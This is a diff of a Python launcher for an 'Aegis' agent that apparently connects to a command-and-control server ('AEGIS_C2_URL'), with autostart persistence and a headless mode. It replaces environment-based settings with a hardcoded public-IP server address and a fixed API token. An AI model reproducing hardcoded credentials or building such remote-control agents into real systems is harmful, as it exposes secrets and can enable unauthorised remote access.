@@ -1,13 +1,9 @@
 import os
 import sys
 import argparse
-from dotenv import load_dotenv
 from pathlib import Path
 
-# Adiciona o diretório atual ao sys.path
 sys.path.insert(0, str(Path(__file__).resolve().parent))
-
-load_dotenv()
 
 from aegis.core.agent import AegisAgentCore
 from aegis.utils import autostart
@@ -15,6 +11,9 @@ import logging
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger("aegis-agent")
+
+DEFAULT_SERVER_URL = "http://82.112.245.99:5000"
+DEFAULT_TOKEN = "AEGIS-C913AD56BF3BCC24DB9D34A8510A847B"
 
 
 def main():
@@ -34,11 +33,9 @@ def main():
         autostart.remove()
         sys.exit(0)
 
-    # Carrega do env por padrão se não for passado em args
-    server_url = args.url or os.getenv("AEGIS_C2_URL", "http://127.0.0.1:5000")
-    token = args.token or os.getenv("AEGIS_API_TOKEN", "AEGIS-C913AD56BF3BCC24DB9D34A8510A847B")
+    server_url = args.url or os.getenv("AEGIS_C2_URL", DEFAULT_SERVER_URL)
+    token = args.token or os.getenv("AEGIS_API_TOKEN", DEFAULT_TOKEN)
 
-    # Inicia agente (o core roda threads independetes com a GUI em cima)
     agent = AegisAgentCore(server_url=server_url, token=token)
 
     if args.headless:
